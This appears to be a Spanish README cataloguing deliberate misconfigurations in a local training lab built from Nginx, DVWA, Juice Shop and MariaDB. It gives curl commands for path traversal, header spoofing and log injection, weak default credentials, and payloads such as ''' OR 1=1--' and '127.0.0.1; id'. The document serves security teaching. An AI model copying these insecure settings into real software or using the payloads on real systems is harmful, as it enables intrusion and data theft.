# Catalogo de vulnerabilidades del laboratorio

Cada item indica:
- **Donde** vive la mala configuracion en el repo.
- **Como** se reproduce desde el host (con `curl` o un navegador).
- **Que se aprende** o que ejercicio sugerido proponer a un companero.

Los puertos asumen los valores por defecto de `.env.example`.

---

## Proxy reverso (Nginx)

Todas estas vulnerabilidades viven en `proxy/nginx.conf` y
`proxy/conf.d/00-lab.conf`, etiquetadas como `[MISCONFIG #N]`.

### #1 - Divulgacion de version (`server_tokens on`)

```bash
curl -sI http://localhost:8080/ | grep -i server
# Server: nginx/1.25.X
```

Aprende: por que ocultar el banner reduce la superficie de ataque y como
herramientas como `whatweb`, `nmap http-enum` o `nikto` lo aprovechan.

### #2 - Logs sin sanitizacion

El formato `lab_combined` registra User-Agent, Referer, `X-Forwarded-For` y
`X-Real-IP` tal cual los manda el cliente. Permite practicar **log injection**
y **log poisoning** (luego una LFI puede leer esos logs).

```bash
curl http://localhost:8080/ -A $'AAA\n2025-01-01 fake admin login'
```

### #3 - Sin limite de tamano de cuerpo

```nginx
client_max_body_size 0;
```

Practicar DoS por subida masiva o abuso de endpoints que aceptan multipart.

### #4 - Confianza ciega en `X-Forwarded-For`

```bash
curl -H 'X-Forwarded-For: 127.0.0.1' http://localhost:8080/dvwa/login.php
```

Aprende: muchas apps confian en la IP "real" para autorizar acciones sensibles
(panel admin solo desde LAN, rate-limit por IP, etc.). Aqui se puede
spoofear desde cualquier origen.

### #5 - Sin cabeceras de seguridad

```bash
curl -sI http://localhost:8080/ | grep -iE 'x-frame|content-security|x-content|strict-transport|referrer'
# (vacio)
```

Ejercicio: redactar el bloque correcto con `add_header` y demostrar el impacto
en un XSS reflejado de DVWA.

### #6 - gzip sobre respuestas con cookies (CRIME-friendly)

```nginx
gzip on; gzip_proxied any;
```

Mostrar como el atacante puede medir longitudes para inferir secretos en
cookies cuando la compresion se aplica en presencia de HTTPS (en este lab
es HTTP, pero sirve para ensenar el concepto).

### #7 - `stub_status` sin ACL

```bash
curl http://localhost:8080/nginx_status
curl http://localhost:8088/
```

Cualquier escaneo encuentra rapidamente metricas internas.

### #8 - Path traversal por `alias` mal cerrado

La directiva es:

```nginx
location /assets {
    alias /usr/share/nginx/html/static/;
    autoindex on;
}
```

El `location` no termina en `/` mientras el `alias` si: clasico bug de
"alias traversal". Aprovechalo:

```bash
curl http://localhost:8080/assets../50x.html
curl http://localhost:8080/assets../index.html
```

### #9 - `autoindex on` en directorios publicos

```bash
curl http://localhost:8080/assets/
curl http://localhost:8080/backup/
```

Listado completo del directorio + acceso al `backup.txt` con secretos
sembrados a proposito.

### #10 - Endpoint `/backup/` con secretos plantados

```bash
curl http://localhost:8080/backup/backup.txt
# DB_USER=dvwa
# DB_PASSWORD=p@ssw0rd
# ADMIN_TOKEN=lab-demo-token-1234
```

### #11 - Reescritura debil hacia DVWA

`rewrite ^/dvwa/?(.*)$ /$1 break;` permite jugar con `..` codificado y
acceder a recursos de DVWA fuera del prefijo previsto, util para ejercicios
de **path confusion** en proxies.

### #12 - phpMyAdmin publicado sin ACL

```bash
curl -I http://localhost:8080/dbadmin/
```

Combinado con la base `corp` y los usuarios debiles del init SQL es trivial
sacar datos. Login sugeridos:

| Usuario     | Contrasena   | Notas                             |
|-------------|--------------|-----------------------------------|
| `dvwa`      | `p@ssw0rd`   | dueno de las bases `dvwa` y `corp`|
| `guest`     | *(vacia)*    | clasico user sin password         |
| `reporting` | `reporting`  | mismo nombre que el usuario       |
| `backup`    | `backup123`  | tiene `FILE` privilege            |
| `root`      | `root`       | superusuario                      |

### #13 - Sin filtros sobre archivos sensibles

`.git/`, `.env`, `.htaccess`, `dump.sql`, `*.bak` se sirven como estaticos
si aparecieran en el directorio raiz del proxy. Ejercicio: planta un `.git`
en el contenedor y practica `git-dumper`.

### #14 - Metodos HTTP peligrosos no filtrados

```bash
curl -X TRACE http://localhost:8080/
curl -X OPTIONS -i http://localhost:8080/
```

Cross-Site Tracing (XST) y enumeracion de metodos.

### #15 - Errores 5xx con detalles

Apaga DVWA (`docker stop lab-dvwa`) y entra en `/dvwa/`. La respuesta de
Nginx revela su version.

### #16 - `stub_status` en su propio puerto (`:8088`)

Replica el patron "metricas internas accesibles desde la DMZ".

---

## DVWA - `http://localhost:8080/dvwa/` (o `:8081`)

Credenciales por defecto: **admin / password**. Tras el primer login pulsa
"Create / Reset Database".

Modulos clasicos para practicar:

| Modulo                | Tecnica                                |
|-----------------------|----------------------------------------|
| SQL Injection         | union-based, blind, time-based         |
| SQL Injection (Blind) | inferencia bit a bit                   |
| XSS Reflected         | payloads en parametros GET             |
| XSS Stored            | persistencia + cookies                 |
| CSRF                  | cambio de password sin token           |
| Command Injection     | `127.0.0.1; id`                        |
| File Upload           | bypass por extension/MIME              |
| File Inclusion        | LFI/RFI con `?page=`                   |
| Brute Force           | login + Hydra/Burp Intruder            |

Sube la dificultad desde "DVWA Security" cuando una variante te aburra.

---

## Juice Shop - `http://localhost:8080/juice/` (o `:8082`)

Tablero de retos en `/#/score-board` (descubrirlo es uno de los retos).

Buenos primeros retos:

- **Login Admin**: SQLi en email (`' OR 1=1--`).
- **Score Board**: encontrar la ruta oculta.
- **Forged Reviews**: tampering JWT en peticiones.
- **DOM XSS**: payload en la barra de busqueda.
- **Privilege Escalation**: cambiar el rol en el JWT.

---

## MariaDB / Datos sinteticos

Base `corp` poblada por `db/init/01-init.sql`:

- `corp.empleados`: 5 usuarios con hashes **MD5 sin sal** (cracking facil).
- `corp.tarjetas`: numeros de prueba (los conocidos `4111...`).
- `corp.notas`: contiene un payload XSS almacenado para ejercicios.

Ejercicio sugerido: tras una SQLi en DVWA, exfiltrar `corp.empleados`,
crackear los MD5 con `john` o `hashcat` y autenticarse en phpMyAdmin como
otro usuario.

---

## Ideas para extender el lab

- Anadir un contenedor con Mutillidae o bWAPP detras del mismo proxy.
- Sustituir el listado de usuarios MySQL por un esquema con SSO falso
  vulnerable a SAML/JWT confusion.
- Anadir un `cron` que escriba periodicamente en logs para practicar log
  poisoning + LFI.
- Agregar un servicio Redis sin password para ejercicios de SSRF -> Redis.
- Generar certificados auto-firmados y exponer un `:443` del proxy con
  ciphers debiles para practicar `testssl.sh`.
